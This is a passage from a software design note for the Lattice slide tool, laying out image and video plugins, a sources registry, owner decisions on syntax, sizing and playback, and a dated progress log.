## 5. Why records, not Marp keywords

Marp hides options in the alt text (`![bg left:40% blur](x)`), so the alt text a screen reader needs is
also the place that says "bg left". It is a private grammar the house notation was built to retire, half of it
is not implemented here (D5), and it cannot carry a key with a value (`poster=`, `focus=top`). A Segno record
gives every option a name, completes in the editor through the `@` trigger, and gets a Compose panel from its
declared fields, as pills, icons and avatars already do.

Keeping `![alt](src)` as the alias costs nothing and keeps decks readable outside Lattice. Export-to-Marp
(`lib/core/marp-bundle.js`) writes Marp's keywords back out, so a round trip to Marp still works.

## 6. Options not taken

- **One `media` plugin for both.** Images are on by default and video is not; one plugin would load the
  provider table for every deck with a picture.
- **Sources as part of each plugin.** The `collage`, `image` and `video` layouts and the CSS `url()` path all
  need sources, and the security predicate must see every one. Splitting sources by plugin is how D2 happened.
- **A fallback chain across sources** ("try the deck folder, then the Library"). Rejected once already
  (`2026-10-07-sample-images.md`): a missing file would silently show a different picture.
- **Fetching in the render.** The render stays synchronous and offline; every fetch happens in the bake,
  behind consent.

## 7. Build order

Each slice ships on its own, smallest risk first.

1. **Sources registry**, no visible change except fixes: the six rows, `isRemoteUrl` derived from them, the
   repeated regexes deleted, `asset:` resolving in the CLI against a deck-folder map, and D1 fixed by passing
   the deck folder as `baseUrl`. Maker-checker (it moves a HARD RULE #22 predicate).
2. **`video` plugin**: the table moves, `@video{…}` on any slide, the `file` row, the poster chain, the oEmbed
   cache read. Demo deck (HARD RULE #9).
3. **`image` plugin**: `@image{…}`, the options and registers, one lift for both paths (D3, D4), Marp keywords
   rewritten by `lint:deck --fix` (§8, decision 2). Demo deck.
4. **Bake materialization and the content-addressed cache**, then the first remote source behind consent.
   Google Drive comes after the desktop app holds a token.

Adversarial trio on every slice (HARD RULE #25). Slices 1 and 4 move the remote predicate and add a fetch, and
slices 2 and 3 replace passes that read slide text into an address (§4.5), so each one is a trust boundary.
Slices 2 and 3 rebase onto #2725 once it lands, because they delete rows from its allowlist.

## 8. Decisions (owner, 2026-10-16)

1. **Packaging: on hold.** The owner held this one. The options stay as written: a core sources registry plus
   separate `image` and `video` plugins (this note's recommendation, §4.4), one `media` plugin, or all core.
   Slice 1 (the sources registry) is core under every option, so it does not wait on this. The rule in §4.5
   (a plugin reads only its own block and writes only its own figure) argues for separate plugins: each one's
   input is narrower, so each one is easier to prove.
2. **Marp's alt-text keywords: a clean break, with an autofix.** `![alt](src)` stays as the plain image alias.
   Placement and treatment move to `@image{…}`, and `lint:deck --fix` rewrites `![bg left](x)` and the rest.
   This matches Segno's no-dual-syntax decision. Export-to-Marp still writes the keywords back out.
3. **Video gets the sigil `>`:** `` `>{https://youtu.be/…}` `` is `@video{…}`. The tag set is
   `INLINE_TAGS` in `lib/plugins/resolve.js:419` (`~ ^ !` today), so slice 2 widens it to four and has
   to show that no shipped grammar reads an inline code span that starts with `>{`. The sigil is typed only in
   source, so no glyph reaches a slide (HARD RULE #29).
4. **Remote sources are fetched in the bake into a content-addressed cache, behind consent** (§4.1). The
   render stays offline, and an export carries one copy of each file.
5. **A plugin describes; the layout places** (§4.7). Placement, fit and scrim belong to the component the record
   sits in. Size is the one exception, as a relative `sm` / `md` / `lg` (decision 12).
9. **Standards first** (§4.7, rule 2): a field's meaning and name come from the standard that defines it (HTML, CSS,
   Media Fragments, the hosts' player parameters, URIs, the Wi-Fi URI, vCard, ISO/IEC 18004). Lattice coins a word only
   where the standard's spelling would significantly hurt understanding, and accepts the standard's name beside it.
   `fullscreen` was weighed against the hosts and left out (§4.7), then admitted from the presentation standard
   (§4.8).
6. **Treatments: settled into three controls (§4.7):** frames (3–5, off by default, shared by all three plugins),
   finishes on the photo (`nimbus` and the others that suit a photograph), and tones (`duotone`, `grayscale`). Which
   frames and finishes make the cut was settled from renders on two real photographs (owner, 2026-10-16): **all five
   frames** (`mat`, `keyline`, `float`, `device`, `corners`) and **all three finishes** (`nimbus`, `halo`,
   `meridian`), with both tones. `stack` and `strata` were rendered and left out.
7. **No `start=`** (reversed the same day under rule 2 of §4.7). A start time is part of the address, as each host
   and W3C Media Fragments define it.
8. **A QR code takes `c1` … `c12`**, with a lint for scan contrast.
10. **The next advance plays a waiting clip** (§4.8), as in PowerPoint and Google Slides: the familiar behavior for
    most presenters, and it lets the speaker introduce the clip first. `autoplay` gives Keynote's behavior.
11. **A clip fills the stage when it plays, by default** (§4.8). `fullscreen=false` opts out.
12. **`sm` / `md` / `lg` size images, video players and QR codes** (§4.7), `md` by default: a small relative step,
    clamped so `lg` never overflows its box and `sm` never drops below a legible floor.

## 9. Progress

- 2026-10-16: audit and proposal written; D1 confirmed by render and logged. Owner settled decisions 2-4;
  decision 1 (packaging) is on hold.
- 2026-10-16: decision 12: `sm` / `md` / `lg` on all three plugins, clamped inside the layout's box.
- 2026-10-16: finishes and tones take one strength lever, `20` … `80` `full`, the `backdrop:` scale.
- 2026-10-16: owner kept all five frames and all three finishes after renders on real photographs; §4.9 lists the
  fixes the prototype found.
- 2026-10-16: styling settled into frames, finishes on the photo and tones; six frame candidates and four finish
  candidates rendered for the pick.
- 2026-10-16: decisions 10 and 11 recorded: the next advance plays a waiting clip; full screen is the default.
- 2026-10-16: §4.8 added: playing a clip while presenting, with PowerPoint's playback options as the standard
  (`fullscreen` = *Play Full Screen*, the next advance plays a waiting clip).
- 2026-10-16: §4.7 rewritten under the standards-first rule: `alt`, `caption`, `title` from HTML; HTML's video
  attributes mapped per host; `start=`, `fullscreen` and `gdrive:` dropped.
- 2026-10-16: the `qr` word left the video record; a QR beside a clip is the `video` slide's `qr` variant.
- 2026-10-16: §4.7 added, then revised on the owner's answer: a plugin describes (thing, title, description and a few
  per-plugin words), the layout places. Treatments split into settings (finishes on the mat) and tones (duotone, mono).
- 2026-10-16: D3, D4, D8, D9 and the runtime-mirror path reproduced on real surfaces (CLI renders, the Studio
  under Playwright, `engine.render`). D3 turned out worse than first written, and D4 and D9 narrower.
- 2026-10-16: a fact-check pass corrected five citations: the scheme-check count, a line number, the scope of
  `rebuilt-classes.js`, and the status of #2725's check, which is not pushed yet.
- 2026-10-16: §4.6 added: each plugin's guide, fixtures, drawn icon and docs-site entry.
- 2026-10-16: §4.5 added after #2725's attack. The design now takes every address from the author's block.
  The inline records stay off the runtime DOM mirror, and every slice gets the adversarial trio.
